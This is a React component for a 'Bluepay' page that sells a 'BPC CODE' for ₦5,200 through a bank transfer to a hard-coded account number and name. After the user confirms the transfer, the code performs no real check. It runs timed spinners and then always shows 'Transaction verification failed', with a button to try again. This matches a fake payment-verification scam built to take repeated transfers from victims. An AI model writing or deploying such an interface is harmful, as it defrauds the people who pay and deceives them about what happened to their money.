
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { ArrowLeft, X, CheckCircle, Copy } from 'lucide-react';

interface BpcPaymentPageProps {
  onBack: () => void;
}

const BpcPaymentPage: React.FC<BpcPaymentPageProps> = ({ onBack }) => {
  const [step, setStep] = useState('form'); // form, preparing, account, verifying, failed
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [amount, setAmount] = useState('5200');

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log('BPC form submitted:', { fullName, email, amount });
    
    if (!fullName || !email) {
      console.log('Form validation failed - missing fields');
      return;
    }
    
    console.log('Starting preparation phase...');
    setStep('preparing');
    setTimeout(() => {
      console.log('Moving to account details...');
      setStep('account');
    }, 6000);
  };

  const handleBankTransferConfirm = () => {
    console.log('Bank transfer confirmed, starting verification...');
    setStep('verifying');
    setTimeout(() => {
      console.log('Verification failed...');
      setStep('failed');
    }, 7000);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    console.log('Copied to clipboard:', text);
  };

  if (step === 'form') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-800">
        {/* Header */}
        <div className="px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Bluepay</h1>
        </div>

        <div className="bg-white mx-4 rounded-t-3xl mt-8 min-h-[calc(100vh-120px)]">
          <div className="p-6">
            <h2 className="text-xl font-semibold text-gray-900 mb-6">Complete Payment</h2>
            
            <form onSubmit={handleFormSubmit} className="space-y-6">
              <div>
                <label className="block text-gray-700 text-sm mb-2">Amount</label>
                <Input
                  type="text"
                  value={`₦${amount}`}
                  readOnly
                  className="h-14 rounded-xl border-2 border-gray-300 bg-gray-50 text-base"
                />
              </div>

              <div>
                <label className="block text-gray-700 text-sm mb-2">Full Name</label>
                <Input
                  type="text"
                  placeholder="Your full name"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  required
                  className="h-14 rounded-xl border-2 border-gray-300 text-base"
                />
              </div>

              <div>
                <label className="block text-gray-700 text-sm mb-2">Your Email Address</label>
                <Input
                  type="email"
                  placeholder="email address"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="h-14 rounded-xl border-2 border-gray-300 text-base"
                />
              </div>

              <Button
                type="submit"
                className="w-full h-14 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-lg font-medium mt-8"
              >
                Pay
              </Button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'preparing') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center max-w-sm mx-4">
          <div className="mb-6">
            <div className="relative w-24 h-24 mx-auto">
              <div className="absolute inset-0 rounded-full border-4 border-blue-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-blue-600 border-t-transparent animate-spin"></div>
              <div className="absolute inset-4 bg-blue-100 rounded-full flex items-center justify-center">
                <div className="w-8 h-8 border-2 border-blue-600 rounded-sm"></div>
              </div>
            </div>
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Preparing Payment Account</h2>
          <p className="text-gray-600">
            Please wait while we set up your payment details...
          </p>
        </div>
      </div>
    );
  }

  if (step === 'account') {
    return (
      <div className="min-h-screen bg-gray-100">
        {/* Header */}
        <div className="bg-white px-4 py-4 flex items-center justify-between shadow-sm">
          <h1 className="text-lg font-semibold text-gray-900">Bank Transfer</h1>
          <button onClick={onBack} className="text-red-500 font-medium">
            Cancel
          </button>
        </div>

        <div className="p-4">
          {/* Amount Circle */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
              <span className="text-white text-2xl font-bold">₦</span>
            </div>
            <h2 className="text-3xl font-bold text-gray-900">NGN 5,200</h2>
            <p className="text-gray-600">{email}</p>
          </div>

          <p className="text-center text-gray-700 mb-6">
            Make to the above account to generate your BPC CODE
          </p>

          {/* Account Details */}
          <div className="bg-white rounded-xl p-4 mb-6 space-y-4">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-600 text-sm">Amount</p>
                <p className="text-lg font-semibold">5200</p>
              </div>
              <button onClick={() => copyToClipboard('5200')} className="p-2 bg-blue-400 rounded-lg">
                <Copy size={16} className="text-white" />
              </button>
            </div>

            <div className="flex justify-between items-center">
              <div>
                <p className="text-gray-600 text-sm">Account Number</p>
                <p className="text-lg font-semibold">5268583383</p>
              </div>
              <button onClick={() => copyToClipboard('5268583383')} className="p-2 bg-blue-400 rounded-lg">
                <Copy size={16} className="text-white" />
              </button>
            </div>

            <div>
              <p className="text-gray-600 text-sm">Bank Name</p>
              <p className="text-lg font-semibold">Sterling bank</p>
            </div>

            <div>
              <p className="text-gray-600 text-sm">Account Name</p>
              <p className="text-lg font-semibold">CORALPAY-Next PG</p>
            </div>
          </div>

          <p className="text-gray-600 text-sm mb-6">
            Make payment to the above account to generate your BPC CODE
          </p>

          <Button
            onClick={handleBankTransferConfirm}
            className="w-full h-14 bg-blue-400 hover:bg-blue-500 text-white rounded-xl text-lg font-semibold"
          >
            I have made this bank Transfer
          </Button>
        </div>
      </div>
    );
  }

  if (step === 'verifying') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center max-w-sm mx-4">
          <div className="mb-6">
            <div className="w-24 h-24 mx-auto">
              <div className="w-full h-full rounded-full border-4 border-blue-600 border-t-transparent animate-spin"></div>
            </div>
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Verifying Payment</h2>
          <p className="text-gray-600 mb-2">
            Please wait while we verify your payment...
          </p>
          <p className="text-gray-500 text-sm">
            This may take a few moments
          </p>
        </div>
      </div>
    );
  }

  if (step === 'failed') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-2xl shadow-lg text-center max-w-sm mx-4">
          <div className="mb-6">
            <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto">
              <X size={40} className="text-white" />
            </div>
          </div>
          
          <h2 className="text-2xl font-bold text-orange-600 mb-4">
            Transaction verification failed!
          </h2>
          
          <p className="text-gray-700 mb-2">
            Your payment could not be completed.
          </p>
          <p className="text-gray-700 mb-6">
            <span className="font-medium">Reason:</span> Unable to validate account / invalid mobile money account.
          </p>

          <div className="mb-6">
            <div className="bg-gray-100 rounded-lg p-4 flex items-center justify-between">
              <span className="text-gray-800">••••••••••••</span>
              <button className="text-gray-600">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
              </button>
            </div>
          </div>

          <div className="space-y-3">
            <Button
              onClick={() => setStep('form')}
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-base font-medium"
            >
              Try Again
            </Button>
            
            <Button
              onClick={onBack}
              variant="outline"
              className="w-full h-12 border-gray-300 text-gray-700 rounded-xl text-base font-medium"
            >
              Return to Dashboard
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return null;
};

export default BpcPaymentPage;
